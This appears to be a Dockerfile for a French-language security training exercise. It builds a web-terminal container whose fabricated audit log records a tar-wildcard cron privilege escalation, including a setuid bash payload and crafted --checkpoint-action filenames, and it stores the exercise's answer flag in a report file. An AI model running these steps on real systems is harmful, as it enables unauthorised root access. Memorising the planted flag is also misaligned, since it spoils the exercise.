FROM debian:bookworm-20250630-slim

RUN apt-get update && apt-get install -y --no-install-recommends coreutils curl ca-certificates \
    && rm -rf /var/lib/apt/lists/*

RUN curl -fsSL -o /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64 \
    && chmod +x /usr/local/bin/ttyd

# Historique reconstituant la sequence du Module 22 (joker tar dans une cron).
# Aucune apostrophe/guillemet dans le contenu (compat printf single-quote).
RUN printf '2026-07-18 09:14:02 stagiaire: id\n2026-07-18 09:14:10 stagiaire: cat /etc/cron.d/archive\n2026-07-18 09:14:25 stagiaire: ls -la /var/backups/data\n2026-07-18 09:15:03 stagiaire: cd /var/backups/data\n2026-07-18 09:15:11 stagiaire: nano payload.sh (contenu: cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)\n2026-07-18 09:15:14 stagiaire: chmod +x payload.sh\n2026-07-18 09:15:22 stagiaire: touch -- --checkpoint=1\n2026-07-18 09:15:26 stagiaire: touch -- --checkpoint-action=exec=sh payload.sh\n2026-07-18 09:16:31 stagiaire: /tmp/rootbash -p\n2026-07-18 09:16:35 root: id\n' \
    > /var/log/session_audit.log

RUN printf 'Technique confirmee : injection par joker (wildcard) tar dans une tache cron.\nReference : CYBERACE{technique_identifiee_joker_tar_cron}\n' \
    > /root/soc_report.txt

WORKDIR /root
EXPOSE 7681
ENTRYPOINT ["ttyd", "-p", "7681", "bash"]
